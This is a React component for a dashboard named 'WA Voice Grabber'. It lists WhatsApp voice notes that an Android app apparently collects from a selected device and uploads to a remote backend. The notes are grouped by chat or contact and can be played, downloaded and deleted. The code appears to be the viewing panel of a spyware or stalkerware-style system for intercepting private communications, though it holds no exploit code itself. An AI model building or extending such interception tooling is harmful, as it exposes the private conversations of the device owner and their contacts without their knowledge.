"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
    MessageCircle, RefreshCw, Trash2, Download, Play, Pause,
    FolderOpen, Mic, X, ChevronRight, Search, Check, Volume2,
    Folder, Clock, MoreVertical, CheckSquare, Square
} from 'lucide-react';

// ──────────────────────────────────────────────────────────────────────────────
// Types
// ──────────────────────────────────────────────────────────────────────────────
interface WaVoice {
    id: string;
    url: string;
    folderName: string;        // e.g. "Ahmad Raza", "Family Group"
    contactName?: string;
    created_at: string;
    size?: number;
    name: string;
    deviceId?: string;
}

interface GroupedVoices {
    [folderName: string]: WaVoice[];
}

interface WhatsAppVoiceViewProps {
    selectedDeviceId: string | null;
    userUuid: string;
    setDeleteConfirmation: (data: { isOpen: boolean; ids: string[] }) => void;
}

const BASE_URL = 'https://p01--gallery-eye--9zr85m7yb6s4.code.run';

// ──────────────────────────────────────────────────────────────────────────────
// Mini Audio Player with waveform visualizer bars
// ──────────────────────────────────────────────────────────────────────────────
function WaveAudioPlayer({ url, isGlobalPlaying, onPlayToggle, onEnded }: {
    url: string;
    isGlobalPlaying: boolean;
    onPlayToggle: () => void;
    onEnded: () => void;
}) {
    const audioRef = useRef<HTMLAudioElement>(null);
    const [progress, setProgress] = useState(0);
    const [duration, setDuration] = useState(0);

    useEffect(() => {
        const audio = audioRef.current;
        if (!audio) return;

        if (isGlobalPlaying) {
            audio.play().catch(() => {});
        } else {
            audio.pause();
        }
    }, [isGlobalPlaying]);

    useEffect(() => {
        const audio = audioRef.current;
        if (!audio) return;

        const onTimeUpdate = () => {
            setProgress(audio.currentTime);
        };
        const onLoadedMetadata = () => {
            setDuration(audio.duration || 0);
        };
        const onEnded2 = () => {
            setProgress(0);
            onEnded();
        };
        audio.addEventListener('timeupdate', onTimeUpdate);
        audio.addEventListener('loadedmetadata', onLoadedMetadata);
        audio.addEventListener('ended', onEnded2);
        return () => {
            audio.removeEventListener('timeupdate', onTimeUpdate);
            audio.removeEventListener('loadedmetadata', onLoadedMetadata);
            audio.removeEventListener('ended', onEnded2);
        };
    }, [onEnded]);

    const formatTime = (s: number) => {
        if (!isFinite(s)) return '0:00';
        const m = Math.floor(s / 60);
        const sec = Math.floor(s % 60);
        return `${m}:${sec.toString().padStart(2, '0')}`;
    };

    const handleSeek = (e: React.MouseEvent<HTMLDivElement>) => {
        if (!audioRef.current || !duration) return;
        const rect = e.currentTarget.getBoundingClientRect();
        const ratio = (e.clientX - rect.left) / rect.width;
        audioRef.current.currentTime = ratio * duration;
        setProgress(ratio * duration);
    };

    const progressPct = duration > 0 ? (progress / duration) * 100 : 0;

    return (
        <div className="flex items-center gap-2 w-full">
            <audio ref={audioRef} src={url} preload="metadata" />
            {/* Play/Pause Button */}
            <button
                type="button"
                onClick={onPlayToggle}
                className={`w-8 h-8 rounded-full flex items-center justify-center shrink-0 transition-all cursor-pointer ${
                    isGlobalPlaying
                        ? 'bg-gradient-to-br from-[#25D366] to-[#128C7E] shadow-[0_0_12px_rgba(37,211,102,0.5)]'
                        : 'clay-icon-pod border-[#25D366]/30'
                }`}
            >
                {isGlobalPlaying
                    ? <Pause className="w-3.5 h-3.5 text-white" />
                    : <Play className="w-3.5 h-3.5 text-[#25D366]" />
                }
            </button>

            {/* Waveform / Seek Bar */}
            <div className="flex-1 space-y-0.5">
                <div
                    className="w-full h-1.5 bg-white/10 rounded-full cursor-pointer relative overflow-hidden"
                    onClick={handleSeek}
                >
                    <div
                        className="h-full bg-gradient-to-r from-[#25D366] to-[#128C7E] rounded-full transition-all duration-100"
                        style={{ width: `${progressPct}%` }}
                    />
                </div>
                {/* Animated bars when playing */}
                {isGlobalPlaying && (
                    <div className="flex items-end gap-[2px] h-4 justify-center">
                        {Array.from({ length: 24 }).map((_, i) => {
                            const h = 20 + Math.random() * 80;
                            return (
                                <div
                                    key={i}
                                    className="w-[3px] bg-gradient-to-t from-[#128C7E] to-[#25D366] rounded-full animate-pulse"
                                    style={{
                                        height: `${h}%`,
                                        animationDelay: `${i * 50}ms`,
                                        animationDuration: `${400 + Math.random() * 300}ms`
                                    }}
                                />
                            );
                        })}
                    </div>
                )}
            </div>

            {/* Time */}
            <span className="text-[10px] font-mono text-white/40 shrink-0 w-10 text-right">
                {isGlobalPlaying ? formatTime(progress) : formatTime(duration)}
            </span>
        </div>
    );
}

// ──────────────────────────────────────────────────────────────────────────────
// WhatsApp Folder Avatar (uses initials, WA green theme)
// ──────────────────────────────────────────────────────────────────────────────
function FolderAvatar({ name }: { name: string }) {
    const initials = name
        .split(/\s+/)
        .slice(0, 2)
        .map(w => w[0]?.toUpperCase() || '')
        .join('');

    // Deterministic hue from name string
    const hue = name.split('').reduce((acc, c) => acc + c.charCodeAt(0), 0) % 360;

    return (
        <div
            className="w-12 h-12 rounded-2xl flex items-center justify-center font-black text-sm text-white shrink-0 shadow-[0_4px_16px_rgba(0,0,0,0.5)]"
            style={{
                background: `linear-gradient(135deg, hsl(${hue},60%,35%), hsl(${(hue + 40) % 360},60%,25%))`
            }}
        >
            {initials || <MessageCircle size={18} />}
        </div>
    );
}

// ──────────────────────────────────────────────────────────────────────────────
// Main Component
// ──────────────────────────────────────────────────────────────────────────────
export default function WhatsAppVoiceView({
    selectedDeviceId,
    userUuid,
    setDeleteConfirmation
}: WhatsAppVoiceViewProps) {
    const [voices, setVoices] = useState<WaVoice[]>([]);
    const [isFetching, setIsFetching] = useState(false);
    const [fetchError, setFetchError] = useState<string | null>(null);

    // Folder nav state
    const [selectedFolder, setSelectedFolder] = useState<string | null>(null);
    const [searchQuery, setSearchQuery] = useState('');

    // Playback state (only one plays at a time globally)
    const [playingId, setPlayingId] = useState<string | null>(null);

    // Selection mode
    const [isSelectMode, setIsSelectMode] = useState(false);
    const [selected, setSelected] = useState<Set<string>>(new Set());

    // ── Fetch WA voices from backend ──
    const fetchVoices = useCallback(async () => {
        if (!userUuid || !selectedDeviceId) return;
        setIsFetching(true);
        setFetchError(null);
        try {
            const res = await fetch(
                `${BASE_URL}/whatsapp-voices?uuid=${encodeURIComponent(userUuid)}&deviceId=${encodeURIComponent(selectedDeviceId)}&limit=500`
            );
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            const data = await res.json();
            const items: WaVoice[] = (data.items || []).map((item: any) => ({
                id: item.id,
                url: item.url,
                folderName: item.folderName || 'Unknown Chat',
                contactName: item.contactName || item.folderName || 'Unknown',
                created_at: item.created_at,
                size: item.size,
                name: item.name || item.id?.split('/').pop() || 'voice.ogg',
                deviceId: item.deviceId || selectedDeviceId
            }));
            setVoices(items);
        } catch (err: any) {
            setFetchError(err.message || 'Failed to load WhatsApp voices');
        } finally {
            setIsFetching(false);
        }
    }, [userUuid, selectedDeviceId]);

    useEffect(() => {
        fetchVoices();
        setSelectedFolder(null);
        setPlayingId(null);
        setSelected(new Set());
        setIsSelectMode(false);
    }, [selectedDeviceId, userUuid]);

    // ── Group voices by folder ──
    const grouped: GroupedVoices = voices.reduce((acc, v) => {
        if (!acc[v.folderName]) acc[v.folderName] = [];
        acc[v.folderName].push(v);
        return acc;
    }, {} as GroupedVoices);

    // Sort folders by message count desc
    const sortedFolders = Object.keys(grouped).sort(
        (a, b) => grouped[b].length - grouped[a].length
    );

    // Filter folders by search
    const filteredFolders = sortedFolders.filter(f =>
        f.toLowerCase().includes(searchQuery.toLowerCase())
    );

    // Current folder's voices sorted newest first
    const currentVoices = selectedFolder
        ? [...(grouped[selectedFolder] || [])].sort(
            (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
          )
        : [];

    // ── Delete handler ──
    const handleDelete = (ids: string[]) => {
        setDeleteConfirmation({ isOpen: true, ids });
        // Optimistically remove from local state
        setVoices(prev => prev.filter(v => !ids.includes(v.id)));
        setSelected(new Set());
        setIsSelectMode(false);
    };

    // ── Download handler ──
    const handleDownload = async (voice: WaVoice) => {
        try {
            const proxyUrl = `/api/download?url=${encodeURIComponent(voice.url)}&filename=${encodeURIComponent(voice.name)}`;
            const link = document.createElement('a');
            link.href = proxyUrl;
            link.download = voice.name;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch {
            window.open(voice.url, '_blank');
        }
    };

    // ── Toggle selection ──
    const toggleSelect = (id: string) => {
        const next = new Set(selected);
        if (next.has(id)) next.delete(id);
        else next.add(id);
        setSelected(next);
    };

    // ── Format date ──
    const fmtDate = (d: string) => {
        const date = new Date(d);
        if (isNaN(date.getTime())) return '';
        const now = new Date();
        const diff = (now.getTime() - date.getTime()) / 1000;
        if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
        return date.toLocaleDateString([], { month: 'short', day: 'numeric' });
    };

    // ── Empty / No Device State ──
    if (!selectedDeviceId) {
        return (
            <div className="max-w-6xl mx-auto flex flex-col items-center justify-center min-h-[440px] gap-4 animate-in fade-in duration-400">
                <div className="w-20 h-20 rounded-3xl bg-[#25D366]/10 border border-[#25D366]/20 flex items-center justify-center">
                    <MessageCircle className="w-10 h-10 text-[#25D366]/50" />
                </div>
                <p className="text-sm font-mono text-white/40 font-bold uppercase tracking-widest">Select a Device First</p>
            </div>
        );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // FOLDER LIST VIEW (Instagram Conversations-like)
    // ──────────────────────────────────────────────────────────────────────────
    if (!selectedFolder) {
        return (
            <div className="max-w-3xl mx-auto space-y-4 animate-in fade-in zoom-in-95 duration-300 pb-16">

                {/* ── Header Card ── */}
                <div className="clay-card p-4 sm:p-5 flex items-center justify-between gap-3">
                    <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-2xl bg-gradient-to-br from-[#25D366] to-[#128C7E] flex items-center justify-center shadow-[0_0_20px_rgba(37,211,102,0.3)]">
                            <MessageCircle className="w-5 h-5 text-white" />
                        </div>
                        <div>
                            <h2 className="text-sm font-black text-white uppercase tracking-wider">WA Voice Grabber</h2>
                            <p className="text-[11px] font-mono text-white/40">
                                {voices.length} voices · {sortedFolders.length} chats
                            </p>
                        </div>
                    </div>
                    <button
                        type="button"
                        onClick={fetchVoices}
                        disabled={isFetching}
                        className="clay-button-sm p-2 rounded-xl text-[#25D366] hover:text-white transition-colors cursor-pointer"
                        title="Refresh"
                    >
                        <RefreshCw className={`w-4 h-4 ${isFetching ? 'animate-spin' : ''}`} />
                    </button>
                </div>

                {/* ── Search Bar ── */}
                <div className="clay-coords-badge px-4 py-2.5 rounded-2xl flex items-center gap-2">
                    <Search className="w-4 h-4 text-white/30 shrink-0" />
                    <input
                        type="text"
                        placeholder="Search chats..."
                        value={searchQuery}
                        onChange={e => setSearchQuery(e.target.value)}
                        className="flex-1 bg-transparent text-sm text-white placeholder-white/25 outline-none font-sans"
                    />
                    {searchQuery && (
                        <button type="button" onClick={() => setSearchQuery('')} className="text-white/40 hover:text-white cursor-pointer">
                            <X size={14} />
                        </button>
                    )}
                </div>

                {/* ── Folder List ── */}
                {isFetching ? (
                    <div className="clay-card p-12 flex flex-col items-center gap-3">
                        <RefreshCw className="w-8 h-8 text-[#25D366] animate-spin" />
                        <p className="text-xs font-mono text-white/40 uppercase tracking-widest">Grabbing WA Voices...</p>
                    </div>
                ) : fetchError ? (
                    <div className="clay-card p-8 flex flex-col items-center gap-3">
                        <div className="w-14 h-14 rounded-2xl bg-red-500/15 border border-red-500/30 flex items-center justify-center">
                            <X className="w-7 h-7 text-red-400" />
                        </div>
                        <p className="text-sm font-mono text-red-400 font-bold">{fetchError}</p>
                        <button type="button" onClick={fetchVoices} className="clay-cta-button px-5 py-2 rounded-xl text-xs font-black uppercase tracking-widest cursor-pointer">
                            Retry
                        </button>
                    </div>
                ) : filteredFolders.length === 0 ? (
                    <div className="clay-card p-12 flex flex-col items-center gap-3">
                        <div className="w-20 h-20 rounded-3xl bg-[#25D366]/5 border-2 border-dashed border-[#25D366]/20 flex items-center justify-center">
                            <MessageCircle className="w-10 h-10 text-[#25D366]/25" />
                        </div>
                        <p className="text-xs font-mono text-white/40 font-bold uppercase tracking-widest text-center">
                            {searchQuery ? 'No chats match your search' : 'No WhatsApp voices grabbed yet.\nThe Android app will sync WA audio notes automatically.'}
                        </p>
                    </div>
                ) : (
                    <div className="clay-card overflow-hidden rounded-[2rem]">
                        <div className="divide-y divide-white/5">
                            {filteredFolders.map((folderName, idx) => {
                                const items = grouped[folderName];
                                const latest = items[0];
                                return (
                                    <button
                                        key={folderName}
                                        type="button"
                                        onClick={() => setSelectedFolder(folderName)}
                                        className={`w-full flex items-center gap-4 px-4 py-3.5 sm:px-5 hover:bg-white/[0.03] transition-all cursor-pointer text-left ${idx === 0 ? 'rounded-t-[2rem]' : ''} ${idx === filteredFolders.length - 1 ? 'rounded-b-[2rem]' : ''}`}
                                    >
                                        {/* Avatar */}
                                        <FolderAvatar name={folderName} />

                                        {/* Info */}
                                        <div className="flex-1 min-w-0">
                                            <div className="flex items-center justify-between gap-2">
                                                <span className="text-sm font-black text-white truncate">{folderName}</span>
                                                <span className="text-[10px] font-mono text-white/30 shrink-0">{fmtDate(latest.created_at)}</span>
                                            </div>
                                            <div className="flex items-center gap-1.5 mt-0.5">
                                                <Volume2 className="w-3 h-3 text-[#25D366]/60" />
                                                <span className="text-xs text-white/40 font-mono">
                                                    {items.length} voice {items.length === 1 ? 'note' : 'notes'}
                                                </span>
                                            </div>
                                        </div>

                                        {/* Count Badge + Arrow */}
                                        <div className="flex items-center gap-2 shrink-0">
                                            <div className="min-w-[22px] h-[22px] rounded-full bg-[#25D366] flex items-center justify-center px-1.5">
                                                <span className="text-[10px] font-black text-white leading-none">{items.length}</span>
                                            </div>
                                            <ChevronRight className="w-4 h-4 text-white/20" />
                                        </div>
                                    </button>
                                );
                            })}
                        </div>
                    </div>
                )}
            </div>
        );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // CHAT DETAIL VIEW — voices inside a folder
    // ──────────────────────────────────────────────────────────────────────────
    return (
        <div className="max-w-3xl mx-auto space-y-4 animate-in fade-in slide-in-from-right-4 duration-300 pb-16">

            {/* ── Chat Header ── */}
            <div className="clay-card p-3.5 sm:p-4 flex items-center gap-3">
                <button
                    type="button"
                    onClick={() => {
                        setSelectedFolder(null);
                        setPlayingId(null);
                        setIsSelectMode(false);
                        setSelected(new Set());
                    }}
                    className="clay-button-sm p-2 rounded-xl text-white/60 hover:text-white transition-colors cursor-pointer shrink-0"
                >
                    <ChevronRight className="w-4 h-4 rotate-180" />
                </button>

                <FolderAvatar name={selectedFolder} />

                <div className="flex-1 min-w-0">
                    <h3 className="text-sm font-black text-white truncate">{selectedFolder}</h3>
                    <p className="text-[11px] font-mono text-[#25D366]/70">
                        {currentVoices.length} voice {currentVoices.length === 1 ? 'note' : 'notes'}
                    </p>
                </div>

                {/* Select Mode Toggle */}
                <button
                    type="button"
                    onClick={() => { setIsSelectMode(!isSelectMode); setSelected(new Set()); }}
                    className={`clay-button-sm p-2 rounded-xl transition-all cursor-pointer ${isSelectMode ? 'text-[#25D366] border-[#25D366]/40' : 'text-white/50 hover:text-white'}`}
                    title={isSelectMode ? 'Cancel Selection' : 'Select'}
                >
                    {isSelectMode ? <X size={16} /> : <CheckSquare size={16} />}
                </button>
            </div>

            {/* ── Bulk Delete Bar (when selecting) ── */}
            {isSelectMode && selected.size > 0 && (
                <div className="clay-card-error px-4 py-3 rounded-2xl flex items-center justify-between gap-3 animate-in fade-in duration-150">
                    <span className="text-sm font-black text-red-300">{selected.size} selected</span>
                    <button
                        type="button"
                        onClick={() => handleDelete(Array.from(selected))}
                        className="clay-button-sm px-4 py-2 rounded-xl text-xs font-black text-red-300 flex items-center gap-1.5 cursor-pointer"
                    >
                        <Trash2 size={13} /> Delete
                    </button>
                </div>
            )}

            {/* ── Voice Notes List (WhatsApp chat bubble style) ── */}
            <div className="clay-card overflow-hidden rounded-[2rem]">
                {/* WA-style chat bg pattern */}
                <div className="relative">
                    <div className="absolute inset-0 opacity-[0.02]"
                        style={{
                            backgroundImage: "url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40'%3E%3Cpath d='M0 40L40 0M-10 10L10 -10M30 50L50 30' stroke='%2325D366' stroke-width='1'/%3E%3C/svg%3E\")"
                        }}
                    />
                    <div className="relative z-10 p-4 sm:p-5 space-y-2.5 max-h-[600px] overflow-y-auto custom-scrollbar">
                        {currentVoices.length === 0 ? (
                            <div className="py-12 flex flex-col items-center gap-3">
                                <Mic className="w-10 h-10 text-white/10" />
                                <p className="text-xs font-mono text-white/30 uppercase tracking-widest">No voices in this chat</p>
                            </div>
                        ) : currentVoices.map((voice, idx) => {
                            const isPlaying = playingId === voice.id;
                            const isChecked = selected.has(voice.id);

                            return (
                                <div
                                    key={voice.id}
                                    className={`flex items-start gap-2.5 group animate-in fade-in duration-200`}
                                    style={{ animationDelay: `${idx * 30}ms` }}
                                >
                                    {/* Selection checkbox */}
                                    {isSelectMode && (
                                        <button
                                            type="button"
                                            onClick={() => toggleSelect(voice.id)}
                                            className="mt-2.5 shrink-0 cursor-pointer"
                                        >
                                            {isChecked
                                                ? <CheckSquare className="w-4 h-4 text-[#25D366]" />
                                                : <Square className="w-4 h-4 text-white/20" />
                                            }
                                        </button>
                                    )}

                                    {/* WA Bubble */}
                                    <div
                                        className={`flex-1 rounded-2xl rounded-tl-sm p-3 space-y-2 transition-all ${
                                            isPlaying
                                                ? 'bg-[#25D366]/15 border border-[#25D366]/40 shadow-[0_0_16px_rgba(37,211,102,0.15)]'
                                                : 'clay-capsule'
                                        }`}
                                    >
                                        {/* Top Row: Icon + timestamp + actions */}
                                        <div className="flex items-center justify-between gap-2">
                                            <div className="flex items-center gap-2">
                                                <div className={`w-6 h-6 rounded-full flex items-center justify-center ${isPlaying ? 'bg-[#25D366]' : 'bg-[#25D366]/15 border border-[#25D366]/30'}`}>
                                                    <Mic className={`w-3 h-3 ${isPlaying ? 'text-white' : 'text-[#25D366]'}`} />
                                                </div>
                                                <span className="text-[10px] font-mono text-white/40">
                                                    {fmtDate(voice.created_at)}
                                                </span>
                                            </div>
                                            <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                                                <button
                                                    type="button"
                                                    onClick={() => handleDownload(voice)}
                                                    className="clay-button-sm p-1.5 rounded-lg text-white/50 hover:text-white transition-colors cursor-pointer"
                                                    title="Download"
                                                >
                                                    <Download size={11} />
                                                </button>
                                                <button
                                                    type="button"
                                                    onClick={() => handleDelete([voice.id])}
                                                    className="clay-card-error p-1.5 rounded-lg text-red-400 hover:text-red-300 transition-colors cursor-pointer"
                                                    title="Delete"
                                                >
                                                    <Trash2 size={11} />
                                                </button>
                                            </div>
                                        </div>

                                        {/* Audio Player */}
                                        <WaveAudioPlayer
                                            url={voice.url}
                                            isGlobalPlaying={isPlaying}
                                            onPlayToggle={() => setPlayingId(isPlaying ? null : voice.id)}
                                            onEnded={() => setPlayingId(null)}
                                        />
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </div>
        </div>
    );
}
